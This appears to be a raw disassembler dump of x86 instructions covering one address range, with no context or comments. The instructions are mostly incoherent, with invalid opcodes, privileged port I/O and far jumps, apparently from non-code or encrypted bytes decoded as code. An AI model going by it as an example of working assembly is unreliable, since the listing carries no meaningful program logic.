  420cb6:	stos   BYTE PTR es:[edi],al
  420cb7:	sub    dl,0xac
  420cba:	jne    0x420c88
  420cbc:	jecxz  0x420cf4
  420cbe:	add    eax,edx
  420cc0:	enter  0x99a2,0x8f
  420cc4:	dec    eax
  420cc5:	pop    DWORD PTR [ebx-0x52]
  420cc8:	xor    ebp,DWORD PTR [esi-0x749d15ff]
  420cce:	fisub  WORD PTR [esi+0x53]
  420cd1:	sbb    cl,dl
  420cd3:	dec    edi
  420cd4:	pop    edx
  420cd5:	icebp  
  420cd6:	xor    al,0x11
  420cd8:	out    0x38,al
  420cda:	jmp    0x4e14:0x8c10027c
  420ce1:	xor    bl,BYTE PTR [edi]
  420ce3:	dec    esi
  420ce4:	xor    DWORD PTR [ebx+0x2e],eax
  420ce7:	dec    ebp
  420ce8:	int3   
  420ce9:	in     eax,dx
  420cea:	pushf  
  420ceb:	pop    esi
  420cec:	push   ebx
  420ced:	ret    
  420cee:	popa   
  420cef:	inc    ebx
  420cf0:	in     al,0x63
  420cf2:	psubq  mm2,QWORD PTR [ecx+0x2fb552d6]
  420cf9:	jb     0x420d6c
  420cfb:	pop    edx
  420cfc:	stos   DWORD PTR es:[edi],eax
  420cfd:	xor    DWORD PTR [esi],ebp
  420cff:	loopne 0x420d31
  420d01:	loopne 0x420d3f
  420d03:	mov    eax,ds:0xc8557716
  420d08:	pop    ecx
  420d09:	gs pushf 
  420d0b:	sub    ebx,DWORD PTR [esi]
  420d0d:	xor    bl,BYTE PTR [edi-0x1c]
  420d10:	xor    BYTE PTR [ebx-0x185d7be9],0x4a
  420d17:	mov    BYTE PTR [edi-0x7ea732dd],bh
  420d1d:	jmp    0x420cb2
  420d1f:	or     ebx,DWORD PTR [edx]
  420d21:	jo     0x420d7b
  420d23:	fistp  QWORD PTR [eax]
  420d25:	cs jo  0x420d17
  420d28:	pop    ds
  420d29:	add    al,0x65
  420d2b:	pop    edx
  420d2c:	or     eax,DWORD PTR [ebp+0x4f172d1d]
  420d32:	call   0x379c:0xda80d515
  420d39:	sub    ebp,DWORD PTR [edx]
  420d3b:	push   esi
  420d3c:	jne    0x420cd8
  420d3e:	cmp    al,0x30
  420d40:	bnd jb 0x420dac
  420d43:	lods   eax,DWORD PTR ds:[esi]
  420d44:	push   ds
  420d45:	shr    BYTE PTR [esi+0x38a198e8],0x12
  420d4c:	jae    0x420ced
  420d4e:	inc    esp
  420d4f:	out    0x97,eax
  420d51:	inc    ebx
  420d52:	dec    ebp
  420d53:	mov    edx,0x40a4185c
  420d58:	repnz add eax,0xf754e8b3
  420d5e:	xchg   ebp,eax
  420d5f:	stos   BYTE PTR es:[edi],al
  420d60:	xchg   edx,eax
  420d61:	data16 or BYTE PTR [ebp+0x69],dl
  420d65:	daa    
  420d66:	pop    ss
  420d67:	dec    ecx
  420d68:	fimul  DWORD PTR [esi+edx*8+0x29]
  420d6c:	cmp    DWORD PTR [eax-0x3295bfb3],esp
  420d72:	pop    ebp
  420d73:	add    al,0x4a
  420d75:	xchg   ecx,eax
  420d76:	loope  0x420dc4
  420d78:	inc    esi
  420d79:	ret    0x4f74
  420d7c:	adc    dx,sp
  420d7f:	jge    0x420d72
  420d81:	ja     0x420d10
  420d83:	adc    BYTE PTR ds:0xade3bb2b,0xc6
  420d8a:	adc    al,0x20
  420d8c:	mov    eax,0xaad6c738
  420d91:	dec    esp
  420d92:	pop    ss
  420d93:	imul   edi,DWORD PTR [ecx],0xa23ce604
  420d99:	and    DWORD PTR [esi],edx
  420d9b:	xchg   ebx,eax
  420d9c:	push   es
  420d9d:	xchg   ebx,eax
  420d9e:	clc    
  420d9f:	pop    edx
  420da0:	fs pop esp
  420da2:	mov    esp,0x3b72e0aa
  420da7:	test   al,0x66
  420da9:	xor    DWORD PTR [ebp-0x9],0xd2625319
  420db0:	(bad)  
  420db2:	xor    eax,0xec1c134
  420db7:	int    0x58
  420db9:	dec    esi
  420dba:	sar    ah,cl
  420dbc:	adc    cl,dl
  420dbe:	loope  0x420d81
  420dc0:	sahf   
  420dc1:	add    eax,0x1b95fdc8
  420dc6:	dec    eax
  420dc7:	jae    0x420e26
  420dc9:	pop    eax
  420dca:	(bad)  
  420dcb:	sbb    DWORD PTR [ebx],ecx
  420dcd:	inc    ecx
  420dce:	out    dx,eax
  420dcf:	push   0x4a
  420dd1:	and    BYTE PTR [esi+edx*8-0x2a],bh
  420dd5:	int    0x53
  420dd7:	xchg   edi,eax
  420dd8:	jge    0x420e0b
  420dda:	pop    edi
  420ddb:	(bad)  
  420ddc:	(bad)  
  420ddd:	xchg   ebp,eax
  420dde:	cli    
  420ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420de0:	inc    ebx
  420de1:	and    BYTE PTR [ecx-0x2f],dl
  420de4:	lock stc 
  420de6:	push   0xffffffa1
  420de8:	repz sbb bh,ch
  420deb:	add    al,0xd9
  420ded:	push   eax
  420dee:	icebp  
  420def:	loop   0x420de0
  420df1:	clc    
  420df2:	and    ebx,DWORD PTR [edi+0x4a]
  420df5:	js     0x420dd2
  420df7:	mov    esp,0x302c5668
  420dfc:	push   ebp
  420dfd:	sub    eax,0x5f22452
  420e02:	push   edi
  420e03:	mov    ebx,0xb948fd5f
  420e08:	sti    
  420e09:	jno    0x420e53
  420e0b:	fild   QWORD PTR [edx]
  420e0d:	inc    eax
  420e0e:	or     DWORD PTR [ebx+0x472312bd],esi
  420e14:	xor    eax,0x52f9ca6d
  420e19:	xchg   esp,eax
  420e1a:	add    edi,DWORD PTR [eax-0x32d591c7]
  420e20:	addr16 mov eax,ds:0xd843
  420e24:	lds    edx,FWORD PTR gs:[ebp+edx*1+0x61]
  420e29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e2a:	cmp    ecx,ebp
  420e2c:	je     0x420dc8
  420e2e:	dec    ebp
  420e2f:	mov    dh,BYTE PTR [ebp+0x46113550]
  420e35:	scas   eax,DWORD PTR es:[edi]
  420e36:	dec    esi
  420e37:	mov    dh,0x52
  420e39:	hlt    
  420e3a:	rcr    DWORD PTR [esi+0x5e16aa41],0x12
  420e41:	in     eax,0xdd
  420e43:	fisub  WORD PTR [edx-0x7]
  420e46:	iret   
  420e47:	inc    ecx
  420e48:	mov    cl,0xe8
  420e4a:	cdq    
  420e4b:	mov    eax,ds:0x9b0fcd9
  420e50:	xchg   edi,eax
  420e51:	sub    eax,0xa1054fad
  420e56:	pop    esp
  420e57:	add    edx,esp
  420e59:	ror    BYTE PTR ds:0xc1ba3157,cl
  420e5f:	ret    0xbe34
  420e62:	inc    edi
  420e63:	mov    ah,0xa4
  420e65:	fidivr DWORD PTR [eax-0x1e019593]
  420e6b:	push   edi
  420e6c:	pop    ecx
  420e6d:	push   es
  420e6e:	inc    esi
  420e6f:	mov    bl,0xcf
  420e71:	in     al,0xa9
  420e73:	ror    BYTE PTR [ebx],cl
  420e75:	push   0xa505f6
  420e7a:	add    BYTE PTR [eax],al
  420e7c:	dec    eax
  420e7d:	out    dx,eax
  420e7e:	ja     0x420eeb
  420e80:	idiv   ebx
  420e82:	pop    esp
  420e83:	out    dx,eax
  420e84:	dec    esp
  420e85:	mul    BYTE PTR [esi-0x7d]
  420e88:	loope  0x420e74
  420e8a:	mov    edi,0x18a48a3
  420e8f:	add    BYTE PTR [ebp+0xe000002],al
  420e95:	xor    edx,DWORD PTR [eax]
  420e97:	xor    eax,ecx
  420e99:	jno    0x420edc
  420e9b:	and    dh,al
  420e9d:	pop    ebx
  420e9e:	dec    ecx
  420e9f:	scas   al,BYTE PTR es:[edi]
  420ea0:	or     ebx,DWORD PTR [ecx]
  420ea2:	jmp    0x4652:0xbee74b09
  420ea9:	je     0x420f09
  420eab:	data16 cmp cl,al
  420eae:	es getsec 
  420eb1:	sub    eax,DWORD PTR [esi]
  420eb3:	mov    DWORD PTR [ebp+ebx*2+0x8fce50f],ecx
  420eba:	jg     0x420f04
  420ebc:	inc    edx
  420ebd:	(bad)  
  420ebe:	sti    
  420ebf:	in     al,0xac
  420ec1:	ficom  WORD PTR [eax]
  420ec3:	cmp    DWORD PTR [ebx],esi
  420ec5:	mov    al,0xe
  420ec7:	ror    BYTE PTR [edi+ecx*2-0x21],1
  420ecb:	sbb    edi,ecx
  420ecd:	add    bl,BYTE PTR [eax+0x3b]
  420ed0:	std    
  420ed1:	dec    edx
  420ed2:	adc    DWORD PTR [eax-0x1e7ada1d],ecx
  420ed8:	aam    0xef
  420eda:	cmp    DWORD PTR [edi+0x4c300c38],esi
  420ee0:	mov    esi,0x8edd2cae
  420ee5:	mov    ebp,0xce315b69
  420eea:	push   ecx
  420eeb:	cmp    DWORD PTR [ecx],esi
  420eed:	adc    BYTE PTR [ecx+ecx*8-0x6e],cl
  420ef1:	int3   
  420ef2:	loopne 0x420eae
  420ef4:	add    BYTE PTR [ebx],bh
  420ef6:	dec    edi
  420ef7:	stos   DWORD PTR es:[edi],eax
  420ef8:	xor    eax,0xe222eef3
  420efd:	push   ebx
  420efe:	xchg   edx,eax
  420eff:	daa    
  420f00:	mov    dh,BYTE PTR [ebx]
  420f02:	jg     0x420f58
  420f04:	outs   dx,DWORD PTR ds:[esi]
  420f05:	inc    eax
  420f06:	inc    ecx
  420f07:	call   0xcc1d:0x1329c566
  420f0e:	out    dx,al
  420f0f:	add    ebp,DWORD PTR [ebx+0x7ff498c6]
  420f15:	ficomp DWORD PTR [ebx]
  420f17:	loope  0x420f48
  420f19:	scas   al,BYTE PTR es:[edi]
  420f1a:	push   ebx
  420f1b:	sbb    DWORD PTR es:[esi+0x7f],edx
  420f1f:	scas   al,BYTE PTR es:[edi]
  420f20:	dec    esi
  420f21:	shr    edx,1
  420f23:	push   esp
  420f24:	ins    DWORD PTR es:[edi],dx
  420f25:	mov    bl,0xd4
  420f27:	and    DWORD PTR [ecx+ebp*8-0x22],esp
  420f2b:	inc    ebx
  420f2c:	mov    ebp,0xaec3be39
  420f31:	inc    DWORD PTR [eax+0x20554e79]
  420f37:	daa    
  420f38:	fdiv   st,st(1)
  420f3a:	adc    ebp,ebx
  420f3c:	sbb    eax,DWORD PTR [ebx+edi*1+0x6500e7d9]
  420f43:	ins    BYTE PTR es:[edi],dx
  420f44:	pop    edx
  420f45:	stc    
  420f46:	(bad)  
  420f47:	xor    DWORD PTR [eax+ebp*2+0xf],edx
  420f4b:	xor    al,0xf
  420f4d:	pop    edx
  420f4e:	enter  0xe665,0xe5
  420f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f53:	xor    DWORD PTR [eax],edi
  420f55:	jmp    0x420fd5
  420f57:	dec    ebx
  420f58:	fmul   QWORD PTR [esi+0x119bba13]
  420f5e:	in     eax,0xb6
  420f60:	or     BYTE PTR [edx],0x1d
  420f63:	hlt    
  420f64:	xor    eax,0xe7019ca5
  420f69:	or     BYTE PTR [ebx],0x34
  420f6c:	call   0xd9e:0xd35265b2
  420f73:	push   ecx
  420f74:	iret   
  420f75:	loop   0x420f14
  420f77:	jns    0x420f42
  420f79:	iret   
  420f7a:	sub    edx,ebx
  420f7c:	inc    esp
  420f7d:	xchg   esi,eax
  420f7e:	pop    edx
  420f7f:	test   eax,0xefacc516
  420f84:	adc    eax,0x3fd9faf6
  420f89:	xor    esi,DWORD PTR ds:0xe5b0a588
  420f8f:	or     eax,0xdcba5f62
  420f94:	xchg   ebp,eax
  420f95:	out    dx,eax
  420f96:	call   0x2107004f
  420f9b:	pop    ds
  420f9c:	mov    DWORD PTR [ecx-0x2f90f26d],ebp
  420fa2:	aas    
  420fa3:	aam    0x8d
  420fa5:	jbe    0x420fd0
  420fa7:	sahf   
  420fa8:	jle    0x420f86
  420faa:	pop    eax
  420fab:	xchg   edi,eax
  420fac:	cmp    BYTE PTR [ebx+0x153479eb],cl
  420fb2:	xchg   BYTE PTR [edx-0x34240214],ah
  420fb8:	call   0x2f29:0x19969ff2
  420fbf:	ins    BYTE PTR es:[edi],dx
  420fc0:	popa   
  420fc1:	mov    eax,ds:0x43cb4191
  420fc6:	cmp    edx,DWORD PTR ds:0x437d2207
  420fcc:	and    edx,DWORD PTR [edx+edx*2-0x5c]
  420fd0:	inc    edx
  420fd1:	push   0xffffff8c
  420fd3:	adc    dh,BYTE PTR [esi+eax*2-0x61]
  420fd7:	xor    al,0xa5
  420fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fda:	dec    ebx
  420fdb:	cld    
  420fdc:	mov    ds:0xa335e845,al
  420fe1:	inc    ebp
  420fe2:	xchg   ecx,eax
  420fe3:	mov    esi,0x9c45bce9
  420fe8:	data16 fisub DWORD PTR [edi-0x1b1fcc70]
  420fef:	pop    esp
  420ff0:	xchg   esi,eax
  420ff1:	sub    al,0x8a
  420ff3:	or     ebx,DWORD PTR [eax+eax*8]
  420ff6:	mov    BYTE PTR [ebp-0x3fef7d2c],cl
  420ffc:	ror    DWORD PTR [ebp-0x50],1
  420fff:	mov    bl,0xcd
  421001:	cmp    dl,bl
  421003:	retf   
  421004:	pop    ebp
  421005:	(bad)  
  421006:	int3   
  421007:	loopne 0x421023
  421009:	dec    ecx
  42100a:	push   0x2ef96440
  42100f:	(bad)  
  421011:	out    dx,eax
  421012:	and    BYTE PTR [edi-0x22450d57],bh
  421018:	push   cs
  421019:	mov    ebx,esp
  42101b:	(bad)  
  42101c:	stc    
  42101d:	pop    esp
  42101e:	stos   DWORD PTR es:[edi],eax
  42101f:	int    0x9d
  421021:	aaa    
  421022:	inc    edx
  421023:	ss jb  0x421046
  421026:	jecxz  0x421043
  421028:	clc    
  421029:	frstor [ebx+0x68]
  42102c:	inc    ebx
  42102d:	call   0xe8f1:0x54ee235c
  421034:	add    ch,BYTE PTR [eax+0x3caf3687]
  42103a:	and    ah,BYTE PTR [ecx+ebp*4+0x1b]
  42103e:	int3   
  42103f:	loope  0x420fc5
  421041:	sub    eax,0x3d92c679
  421046:	dec    esi
  421047:	cmp    al,0xb1
  421049:	test   DWORD PTR [edi],eax
  42104b:	ds mov dh,0x2e
  42104e:	out    dx,eax
  42104f:	rcl    DWORD PTR [edi-0x35],1
  421052:	push   eax
  421053:	cmp    DWORD PTR [esi+ebx*2-0x639d4773],0x74
  42105b:	sbb    ebp,esi
  42105d:	aad    0xdb
  42105f:	cs mov ebp,0xd344d999
  421065:	push   edi
  421066:	xchg   esi,eax
  421067:	or     DWORD PTR [edx-0x7],0xffffffb8
  42106b:	mov    esi,0xf74eea7d
  421070:	cmp    BYTE PTR [esp+edi*8-0xf792964],0xd6
  421078:	xor    BYTE PTR [esi+0x6],0x8b
  42107c:	dec    ebp
  42107d:	jmp    0xb07062d1
  421082:	aas    
  421083:	pop    esi
  421084:	mov    ?,WORD PTR [edx+0x449ab644]
  42108a:	lahf   
  42108b:	nop
  42108c:	adc    cl,0x2d
  42108f:	adc    edx,DWORD PTR [esi+eiz*8]
  421092:	ss mov esp,0xabbd85f1
  421098:	popf   
  421099:	test   eax,0x26abc81a
  42109e:	dec    ebp
  42109f:	in     al,dx
  4210a0:	pop    ebx
  4210a1:	xchg   ecx,eax
  4210a2:	push   eax
  4210a3:	xchg   ebx,eax
  4210a4:	sbb    bl,BYTE PTR [eax]
  4210a6:	mov    ah,0x69
  4210a8:	retf   0x50d3
  4210ab:	sub    eax,0x7da5391
  4210b0:	dec    ebx
  4210b1:	or     eax,0x240c6704
  4210b6:	test   BYTE PTR [ecx-0x66],ch
  4210b9:	jecxz  0x421047
  4210bb:	lods   al,BYTE PTR ds:[esi]
  4210bc:	mov    ah,0xb0
  4210be:	pop    es
  4210bf:	test   al,0xc3
  4210c1:	xchg   ah,al
  4210c3:	push   ds
  4210c4:	lods   al,BYTE PTR ds:[esi]
  4210c5:	addr16 out 0x85,al
  4210c8:	xchg   ecx,eax
  4210c9:	and    edx,ecx
  4210cb:	test   BYTE PTR [eax],bl
  4210cd:	sbb    ebx,DWORD PTR [esi-0x6e]
  4210d0:	sub    DWORD PTR [eax],esp
  4210d2:	cmp    DWORD PTR [ebx],edx
  4210d4:	das    
  4210d5:	pop    es
  4210d6:	or     eax,0x5f5ed40
  4210db:	inc    esi
  4210dc:	ss scas al,BYTE PTR es:[edi]
  4210de:	cwde   
  4210df:	in     al,dx
  4210e0:	retf   
  4210e1:	aas    
  4210e2:	push   esp
  4210e3:	repz dec esp
  4210e5:	add    BYTE PTR [edx-0x72],ch
  4210e8:	adc    bh,dl
  4210ea:	sub    BYTE PTR [eax-0xb2f6ec9],dl
  4210f0:	imul   DWORD PTR [ebx+edx*2-0x1f]
  4210f4:	fsubr  DWORD PTR [edi]
  4210f6:	aad    0x84
  4210f8:	sbb    al,0xa5
  4210fa:	cmp    bl,ch
  4210fc:	pop    ebx
  4210fd:	adc    al,0xb3
  4210ff:	jmp    0xb017b309
  421104:	jge    0x42109a
  421106:	inc    ebx
  421107:	mov    edx,0x7a249041
  42110c:	xor    ch,BYTE PTR [ebx+0x18]
  42110f:	pop    esp
  421110:	push   0x292d97e0
  421115:	cld    
  421116:	in     al,0xe3
  421118:	mov    ah,0x0
  42111a:	add    BYTE PTR [eax],al
  42111c:	mov    al,0xe3
  42111e:	pop    edx
  42111f:	jecxz  0x42117c
  421121:	sti    
  421122:	mov    ecx,0x72415ff3
  421127:	test   DWORD PTR [esi-0x32cfeb08],esp
  42112d:	mov    WORD PTR [ecx],es
  42112f:	add    BYTE PTR [ebp+0x48000002],al
  421135:	adc    ah,BYTE PTR ds:0x2c18e9c3
  42113b:	call   0x4b8b:0x5493dea9
  421142:	dec    esp
  421143:	in     al,dx
  421144:	push   edx
  421145:	dec    eax
  421146:	cs es pop edi
  421149:	repnz dec edi
  42114b:	pop    ss
  42114c:	xchg   ebx,eax
  42114d:	daa    
  42114e:	inc    ecx
  42114f:	repnz pop eax
  421151:	call   0x92bd:0xc9f707e4
  421158:	jmp    FWORD PTR ds:0x148fcd6e
  42115e:	test   al,0xb7
  421160:	jb     0x42115d
  421162:	ins    BYTE PTR es:[edi],dx
  421163:	lea    esp,[esi-0x554eed89]
  421169:	mov    ch,0xa8
  42116b:	sub    BYTE PTR [edx+0x39ee3bdf],cl
  421171:	xor    ch,dl
  421173:	xchg   edi,edi
  421175:	test   al,0xe0
  421177:	jne    0x4211de
  421179:	shl    dl,0xae
  42117c:	inc    edi
  42117d:	and    al,0xcb
  42117f:	call   0xd21acbee
  421184:	dec    ebx
  421185:	inc    eax
  421186:	ror    DWORD PTR [edi],1
  421188:	push   ecx
  421189:	jecxz  0x4211cf
  42118b:	push   ecx
  42118c:	in     eax,0x6a
  42118e:	cmp    al,0x50
  421190:	push   esi
  421191:	and    ah,BYTE PTR [ebp+0x5f]
  421194:	enter  0xd00b,0x88
  421198:	push   0x48
  42119a:	js     0x421120
  42119c:	outs   dx,DWORD PTR ds:[esi]
  42119d:	push   ds
  42119e:	sbb    cl,cl
  4211a0:	mov    ah,0x68
  4211a2:	mov    ch,0xe3
  4211a4:	jae    0x421140
  4211a6:	lock or DWORD PTR [edx+ebx*8-0x75],esp
  4211ab:	mov    edi,0x465b89f5
  4211b0:	ror    BYTE PTR [eax],0x1
  4211b3:	pusha  
  4211b4:	xchg   ecx,eax
  4211b5:	mov    ebp,0xfd9a8fbf
  4211ba:	xor    dh,ah
  4211bc:	mov    ebx,0xd71bc797
  4211c1:	pop    ss
  4211c2:	dec    edi
  4211c3:	inc    esp
  4211c4:	paddusb mm5,QWORD PTR [ebx-0x1b307341]
  4211cb:	gs push ecx
  4211cd:	inc    edi
  4211ce:	(bad)  
  4211cf:	std    
  4211d0:	and    dh,BYTE PTR [esi-0x5f8ac8ac]
  4211d6:	dec    ebx
  4211d7:	or     eax,0x74563566
  4211dc:	jne    0x42116e
  4211de:	jle    0x421160
  4211e0:	xchg   ecx,eax
  4211e1:	clc    
  4211e2:	or     DWORD PTR [eax+ecx*2+0x61],0xffffff99
  4211e7:	pop    esp
  4211e8:	pop    ebx
  4211e9:	mov    ds:0x65cd6f89,al
  4211ee:	pop    esi
  4211ef:	sahf   
  4211f0:	and    al,0x18
  4211f2:	push   es
  4211f3:	jo     0x4211bb
  4211f5:	pop    ebx
  4211f6:	outs   dx,BYTE PTR ds:[esi]
  4211f7:	cwde   
  4211f8:	or     al,0x5a
  4211fa:	inc    edx
  4211fb:	fst    DWORD PTR ds:[ebx]
  4211ff:	adc    eax,0x7cd30b5e
  421204:	mov    ah,0x0
  421206:	push   0x6b44d127
  42120b:	ds es jbe 0x4211db
  42120f:	stos   BYTE PTR es:[edi],al
  421210:	jg     0x421231
  421212:	mov    esi,0xc6b2bc77
  421217:	jbe    0x42126a
  421219:	push   ss
  42121a:	or     DWORD PTR [esi+0x1145aece],edx
  421220:	les    esp,FWORD PTR [ecx+edx*1-0x1e7ff34c]
  421227:	xor    bh,BYTE PTR [esi+0x4fcff422]
  42122d:	shl    DWORD PTR [edx+0x16],1
  421230:	pushf  
  421231:	ror    DWORD PTR [esi+edx*1+0x30],0x1e
  421236:	xchg   edx,eax
  421237:	fdivrp st(7),st
  421239:	retf   
  42123a:	stos   DWORD PTR es:[edi],eax
  42123b:	push   ss
  42123c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42123d:	mov    dh,0x18
  42123f:	xchg   esi,eax
  421240:	clc    
  421241:	aaa    
  421242:	lock daa 
  421244:	jns    0x42128a
  421246:	iret   
  421247:	mov    cs,WORD PTR [edi+ebx*1-0x435190ca]
  42124e:	sub    dh,ah
  421250:	pop    eax
  421251:	aas    
  421252:	scas   eax,DWORD PTR es:[edi]
  421253:	sbb    dh,BYTE PTR [ebx-0x2dcc19f3]
  421259:	shl    DWORD PTR [edx+0x46],1
  42125c:	pop    esi
  42125d:	aaa    
  42125e:	adc    bh,BYTE PTR [edi-0x478db890]
  421264:	xchg   ebx,eax
  421265:	xor    eax,0x6fd6cfb7
  42126a:	dec    ebx
  42126b:	(bad)  
  42126c:	mov    ds:0x7bfe5538,al
  421271:	imul   esi,DWORD PTR [edi+edx*1],0x46f604a4
  421278:	mov    bh,0x58
  42127a:	ret    
  42127b:	loop   0x4212d2
  42127d:	xchg   edi,eax
  42127e:	cdq    
  42127f:	mov    edx,0x3707f35e
  421284:	jge    0x4212f2
  421286:	fist   DWORD PTR [eax]
  421288:	jge    0x4212d6
  42128a:	lods   eax,DWORD PTR ds:[esi]
  42128b:	imul   ebp,DWORD PTR [ecx+eax*2+0xf],0x897a6dfc
  421293:	xor    eax,eax
  421295:	inc    ebx
  421296:	jae    0x4212d6
  421298:	retf   
  421299:	std    
  42129a:	jg     0x4212f6
  42129c:	gs jnp 0x421259
  42129f:	repnz sub BYTE PTR [eax],al
  4212a2:	cdq    
  4212a3:	fwait
  4212a4:	das    
  4212a5:	sub    DWORD PTR [ecx+0x77eb0310],ebx
  4212ab:	je     0x421283
  4212ad:	xchg   ebp,eax
  4212ae:	lea    ebx,[ecx-0x48]
  4212b1:	bnd ds jg 0x4212b7
  4212b5:	mov    ds:0xd04e14eb,al
  4212ba:	dec    eax
  4212bb:	ja     0x421276
  4212bd:	inc    edi
  4212be:	xchg   esi,eax
  4212bf:	jl     0x421299
  4212c1:	push   esi
  4212c2:	in     eax,dx
  4212c3:	inc    ecx
  4212c4:	je     0x421255
  4212c6:	test   al,0x86
  4212c8:	mov    bh,0xef
  4212ca:	pop    edi
  4212cb:	jge    0x4212ce
  4212cd:	xor    BYTE PTR [edx+eax*1],bh
  4212d0:	or     eax,DWORD PTR [edx+0x3f]
  4212d3:	jle    0x421294
  4212d5:	jbe    0x42134d
  4212d7:	cmp    esp,DWORD PTR [esi]
  4212d9:	sbb    eax,DWORD PTR [esi]
  4212db:	push   cs
  4212dc:	popf   
  4212dd:	cmp    BYTE PTR [ebp-0x21],cl
  4212e0:	push   0x35f5d7d7
  4212e5:	push   ebp
  4212e6:	dec    esi
  4212e7:	(bad)  
  4212e8:	fadd   st,st(3)
  4212ea:	psubusw mm6,QWORD PTR [edi+0x22]
  4212ee:	cld    
  4212ef:	inc    esi
  4212f0:	std    
  4212f1:	inc    ecx
  4212f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212f3:	es push edx
  4212f5:	fs dec ebp
  4212f7:	push   esi
  4212f8:	popf   
  4212f9:	pop    eax
  4212fa:	push   ebp
  4212fb:	push   edx
  4212fc:	xchg   esi,eax
  4212fd:	add    eax,0x581d7468
  421302:	iret   
  421303:	mov    eax,ds:0x8cbc3ea3
  421308:	lea    esi,[edi+0x1a027b28]
  42130e:	jg     0x421310
  421310:	mov    ah,0x78
  421312:	(bad)  
  421313:	adc    al,0x48
  421315:	jmp    0x42135b
  421317:	(bad)  
  421318:	test   al,0xf6
  42131a:	lods   al,BYTE PTR ds:[esi]
  42131b:	iret   
  42131c:	out    dx,eax
  42131d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42131e:	mov    ah,0x50
  421320:	daa    
  421321:	sbb    BYTE PTR [esi+0x591caf65],bl
  421327:	and    eax,DWORD PTR [edx+0x6e8246bd]
  42132d:	xchg   DWORD PTR [edx],eax
  42132f:	mov    ebx,0xe20827e9
  421334:	cdq    
  421335:	scas   al,BYTE PTR es:[edi]
  421336:	cli    
  421337:	jecxz  0x421363
  421339:	mov    edx,0x8787ca5
  42133e:	pop    eax
  42133f:	or     BYTE PTR [edi],ch
  421341:	adc    eax,0xe4b110e5
  421346:	add    dl,al
  421348:	cdq    
  421349:	adc    DWORD PTR [ecx+eiz*8-0x6e5c91f8],ecx
  421350:	mov    ?,WORD PTR [edi-0x5b927b46]
  421356:	stos   BYTE PTR es:[edi],al
  421357:	ds dec esp
  421359:	add    ebx,DWORD PTR [ebx+0x68a6a245]
  42135f:	retf   
  421360:	cmp    edi,DWORD PTR ds:0xe15a4c96
  421366:	mov    cl,0xe2
  421368:	enter  0xb030,0x95
  42136c:	push   ebx
  42136d:	jo     0x421351
  42136f:	xor    ah,ch
  421371:	into   
  421372:	psrld  mm0,0x88
  421376:	mov    ecx,esp
  421378:	adc    eax,0xbe4b49df
  42137d:	repz imul ebp,DWORD PTR [ebp+0x757646f6],0xbc2fea03
  421388:	mov    esi,0xa99989a6
  42138d:	lock ja 0x42137c
  421390:	mov    BYTE PTR [edx-0x2d46d8e6],dl
  421396:	or     bh,dh
  421398:	cli    
  421399:	push   ebx
  42139b:	icebp  
  42139c:	adc    ebx,DWORD PTR [ebx+0x339b88e3]
  4213a2:	sbb    eax,0x7ff76851
  4213a7:	xor    dh,BYTE PTR [eax]
  4213a9:	jns    0x421387
  4213ab:	sti    
  4213ac:	test   al,0x63
  4213ae:	scas   eax,DWORD PTR es:[edi]
  4213af:	cmp    eax,0x44ae42d7
  4213b4:	ret    
  4213b5:	or     al,BYTE PTR [edx]
  4213b7:	test   eax,0x36
  4213bc:	xor    eax,0xbf06168e
  4213c1:	sahf   
  4213c2:	xor    eax,0xa0e807bf
  4213c7:	mov    edx,0x58b4f1d6
  4213cc:	push   edx
  4213cd:	pop    DWORD PTR [ecx]
  4213cf:	add    BYTE PTR [ebp+0x7000002],al
  4213d5:	adc    al,0xb1
  4213d7:	test   ebx,esp
  4213d9:	loop   0x421370
  4213db:	lds    eax,FWORD PTR [ebx-0x48]
  4213de:	mov    dl,0x9b
  4213e0:	sub    dh,bh
  4213e2:	inc    edi
  4213e3:	dec    ebx
  4213e4:	push   0xffffff9d
  4213e6:	sub    dl,BYTE PTR [edx+0x13]
  4213e9:	(bad)  
  4213ea:	adc    DWORD PTR [ecx],ebx
  4213ec:	in     eax,0xe5
  4213ee:	mov    ebp,0xad4be239
  4213f3:	xor    eax,0x6c6eb5f6
  4213f8:	loope  0x421404
  4213fa:	cs push ebx
  4213fc:	aas    
  4213fd:	cmc    
  4213fe:	mov    ebx,0xeb7482d4
  421403:	ret    0x1b76
  421406:	js     0x42142a
  421408:	pushf  
  421409:	inc    ecx
  42140a:	cmp    al,al
  42140c:	cdq    
  42140d:	fwait
  42140e:	push   ss
  42140f:	dec    edx
  421410:	mov    esp,0xfc7c29da
  421415:	nop
  421416:	xchg   ecx,eax
  421417:	inc    ecx
  421418:	in     eax,0xc0
  42141a:	mov    ebx,0xe7448452
  42141f:	mov    ah,0x8e
  421421:	mov    esp,0x20a6d04a
  421426:	add    bh,BYTE PTR [ebx]
  421428:	push   edi
  421429:	stos   DWORD PTR es:[edi],eax
  42142a:	test   eax,0x6ba37748
  42142f:	retf   0x51f
  421432:	push   ds
  421433:	pop    esi
  421434:	xchg   ebx,eax
  421435:	fld    TBYTE PTR [edx+0x20389f64]
  42143b:	push   esi
  42143c:	int3   
  42143d:	test   BYTE PTR [ecx],dl
  42143f:	jle    0x42144c
  421441:	xchg   ecx,eax
  421442:	sar    DWORD PTR [ebp-0x46],0xb5
  421446:	push   edi
  421447:	neg    DWORD PTR [ebp-0x6d]
  42144a:	ins    DWORD PTR es:[edi],dx
  42144b:	fldenv [ebx]
  42144d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42144e:	test   al,0xc0
  421450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421452:	cmp    cl,bl
  421454:	pop    es
  421455:	into   
  421456:	and    ecx,edi
  421458:	int    0x7d
  42145a:	addr16 je 0x4214dc
  42145d:	sub    edi,ecx
  42145f:	jmp    FWORD PTR [edi-0x27c71de5]
  421465:	jecxz  0x4213f4
  421467:	test   al,0x91
  421469:	sbb    BYTE PTR [edi+edi*2+0x5f],ch
  42146d:	dec    edx
  42146e:	rcl    edi,1
  421470:	in     al,dx
  421471:	mov    dl,BYTE PTR [ebx]
  421473:	std    
  421474:	push   ds
  421475:	shl    DWORD PTR [eax],1
  421477:	pop    edi
